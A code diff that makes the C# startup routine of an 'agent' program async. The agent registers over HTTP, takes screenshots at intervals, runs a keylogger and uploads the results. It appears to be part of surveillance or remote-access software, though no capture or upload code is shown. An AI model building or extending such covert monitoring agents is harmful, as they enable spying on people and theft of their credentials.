@@ -39,12 +39,13 @@ namespace ks
 
                 // ------------------ Agent Registration ------------------
                 var regAndReceiver = new RegistrationAndReceiver(httpClient, logger);
-                var receiverTask = Task.Run(() => regAndReceiver.StartAsync(default));
+                await regAndReceiver.StartAsync(default);
+                logger.LogInformation("Registration service started.");
 
                 // ------------------ Screenshot Service ------------------
-                ITakeScreenshot screenshot = new TakeScreenshot(logger);
+                ITakeScreenshotAsync screenshot = new TakeScreenshot(logger);
                 ICaptureWithInterval captureScr = new CaptureWithInterval(screenshot, logger);
-                captureScr.Capture();
+                await captureScr.CaptureAsync();
                 logger.LogInformation("Screenshot service started.");
 
                 // ------------------ Keylogger ------------------
@@ -58,11 +59,10 @@ namespace ks
                 logger.LogInformation("Uploader service initialized.");
 
                 logger.LogInformation("Agent is running....");
-                Application.Run(); // Windows message loop
+                Application.Run();
 
                 // Background service task stop
                 await regAndReceiver.StopAsync(default);
-                await receiverTask;
             }
             catch (Exception ex)
             {
